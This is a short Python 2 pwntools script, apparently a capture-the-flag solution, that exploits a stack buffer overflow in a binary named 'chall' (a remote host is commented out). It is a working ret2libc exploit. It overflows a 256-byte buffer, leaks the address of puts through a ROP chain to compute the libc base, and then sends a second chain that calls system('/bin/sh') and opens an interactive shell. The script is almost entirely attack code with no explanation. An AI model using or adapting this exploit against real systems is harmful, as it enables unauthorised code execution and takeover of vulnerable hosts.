#!/usr/bin/python2
from pwn import *

p = process('./chall')
# p = remote("54.179.3.37", 10030)
libc = ELF('libc.so.6')
binary = ELF('./chall')
context.binary = binary
plt = binary.plt['puts']
got = binary.got['puts']
main = 0x00000000004011D9 #address main
rdi = 0x0000000000401293 

payload = 'a'*256 + 'b'*8
payload += p64(rdi)
payload += p64(got)
payload += p64(plt)
payload += p64(main)

p.sendline(payload)

p.recvline()
libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info('Leak Libc : {}'.format(hex(libc_leak)))
libc.address = libc_leak - libc.symbols['puts']
print(hex(libc.address))
bin_sh = next(libc.search(b'/bin/sh'))
print(hex(bin_sh))
system = libc.symbols['system']
print(hex(system))

payload = 'a'*256 + 'b'*8
payload += p64(rdi)
payload += p64(bin_sh)
payload += p64(0x000000000040101a) #address ret dari ROPgadget
payload += p64(system) 

p.sendline(payload)
p.interactive()